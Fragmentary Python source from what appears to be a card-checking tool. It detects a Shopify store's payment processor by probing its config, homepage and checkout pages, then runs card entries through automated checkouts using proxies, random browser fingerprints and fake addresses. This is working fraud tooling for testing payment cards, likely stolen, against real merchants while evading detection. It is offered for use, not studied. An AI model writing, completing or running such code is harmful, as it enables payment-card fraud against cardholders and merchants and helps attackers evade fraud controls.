...
# ══════════════════════════════════════════════════════════════════════
# GATE DETECTOR — detects payment processor before checkout attempt
# ══════════════════════════════════════════════════════════════════════

GATE_SIGNATURES: Dict[str, List[str]] = {
    "authorize.net": [
        "useAuthorizeUrl", "authorize.net", "accept.authorize.net",
        "jstest.authorize.net", "AcceptUI", "AuthorizeNetIFrame",
        "authorizenet", "Accept.js", "apiLoginID", "clientKey",
        "AuthorizeNet", "anet_",
    ],
    "stripe": [
        "js.stripe.com", "stripe.com/v3", "Stripe(",
        "stripe_publishable_key", "pk_live_", "pk_test_",
        "stripe-js", "stripeElements",
    ],
    "braintree": [
        "js.braintreegateway.com", "braintree.client",
        "braintreegateway", "braintree-web",
    ],
    "square": [
        "squareup.com", "square.com/payments",
        "SqPaymentForm", "Square.js",
    ],
    "adyen": [
    ...
    "cybersource": [
        "cybersource.com", "flex.cybersource", "microform",
    ],
    # PayPal last — Shopify adds PayPal widgets on most stores
    # even when the real payment processor is something else
    "paypal": [
        "paypal.com/sdk/js",
        "paypalobjects.com/api",
    ],
    "shopify_payments": [
        "shopify_payments", "shopifycs.com",
        "shopifyinc.com", "vault.shopify.com",
    ],
}
...
def detect_gate(shop_url: str, client: "TLSClient") -> str:
    """
    Detect the payment gateway used by a Shopify store.
    Returns gate name: authorize.net | stripe | braintree | paypal |
                       shopify_payments | square | adyen | cybersource | unknown
    Caches results per domain.
    """
    domain = re.sub(r"https?://", "", shop_url).split("/")[0].lower()

    with _gate_cache_lock:
        if domain in _gate_cache:
            logger.info(f"Gate cache hit: {domain} → {_gate_cache[domain]}")
            return _gate_cache[domain]

    detected = "shopify_payments"  # default fallback

    try:
        # ── Check 1: /payments/config ──────────────────────────────
        try:
            r = client.get(
                f"{shop_url.rstrip('/')}/payments/config",
                headers={"Accept": "application/json"},
            )
            body = r.text or ""
            for gate, patterns in GATE_SIGNATURES.items():
                if any(p.lower() in body.lower() for p in patterns):
                    detected = gate
                    logger.info(f"Gate detected via /payments/config: {detected}")
                    break
        except Exception:
            pass

        # ── Check 2: checkout page JS assets ──────────────────────
        if detected == "shopify_payments":
            try:
                r = client.get(shop_url.rstrip("/") + "/", headers={"Accept": "text/html"})
                html_body = r.text or ""
                for gate, patterns in GATE_SIGNATURES.items():
                    if any(p.lower() in html_body.lower() for p in patterns):
                        detected = gate
                        logger.info(f"Gate detected via homepage HTML: {detected}")
                        break
            except Exception:
                pass

        # ── Check 3: scan checkout page ────────────────────────────
        if detected == "shopify_payments":
            try:
                r = client.get(
                    shop_url.rstrip("/") + "/checkout",
                    headers={"Accept": "text/html"},
                )
                checkout_html = r.text or ""

                # useAuthorizeUrl is the definitive authorize.net signal
                if "useAuthorizeUrl" in checkout_html:
                    detected = "authorize.net"
                    logger.info("Gate detected via checkout JS: authorize.net (useAuthorizeUrl)")
                else:
                    # scan JS asset filenames referenced in checkout HTML
                    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', checkout_html)
                    js_names = " ".join(js_files).lower()
                    if "authorize" in js_names or "anet" in js_names:
                        detected = "authorize.net"
                        logger.info("Gate detected via checkout JS filename: authorize.net")
                    elif "stripe" in js_names:
                        detected = "stripe"
                        logger.info("Gate detected via checkout JS filename: stripe")
                    elif "braintree" in js_names:
                        detected = "braintree"
                        logger.info("Gate detected via checkout JS filename: braintree")
                    else:
                        # full body scan — paypal last
                        for gate, patterns in GATE_SIGNATURES.items():
                            if gate == "paypal":
                                continue
                            if any(p.lower() in checkout_html.lower() for p in patterns):
                                detected = gate
                                logger.info(f"Gate detected via checkout HTML: {detected}")
                                break
            except Exception:
                pass

    except Exception as e:
        logger.warning(f"Gate detection failed for {domain}: {e}")

    with _gate_cache_lock:
        _gate_cache[domain] = detected

    logger.info(f"Final gate for {domain}: {detected}")
    return detected
...
def extract_delivery_handle(proposal_body: str) -> str:
    ...
    try:
        ...
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                ...
                if handles:
                    return handles[0]
        # Path D: deliveryLines[].selectedDeliveryStrategy.handle
        for line in dlv.get("deliveryLines", []):
            h = line.get("selectedDeliveryStrategy", {}).get("handle", "")
            if h:
                return h
        # Path E: deliveryGroups[].selectedDeliveryStrategy.handle
        for group in seller.get("deliveryGroups", []):
            h = group.get("selectedDeliveryStrategy", {}).get("handle", "")
            if h:
                return h
            for line in group.get("deliveryLines", []):
                h = line.get("selectedDeliveryStrategy", {}).get("handle", "")
                if h:
                    return h
    except Exception:
    ...
    patterns = [
        ...
        r'"deliveryStrategyHandles"\s*:\s*\["([^"]+)"',
        r'"handle"\s*:\s*"(gid://shopify/[^"]+)"',
    ]
    for p in patterns:
...
def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
    """Enhanced version with random browser fingerprints, addresses, and gate detection"""
    currency = "USD"
    country = "US"
    ...
    try:
        # ── Gate Detection ────────────────────────────────────────────
        try:
            gate = detect_gate(shop_url, client)
            result.gate = gate
            logger.info(f"Gate: {gate} for {site_name}")
        except Exception as e:
            gate = "shopify_payments"
            result.gate = gate
            logger.warning(f"Gate detection error: {e} — defaulting to shopify_payments")
        ...
        try:
            ...
            for _pi in range(15):
                ...
                _wait = int(_m.group(1)) / 1000.0 if _m else 1.0
                time.sleep(max(_wait, 0.5))
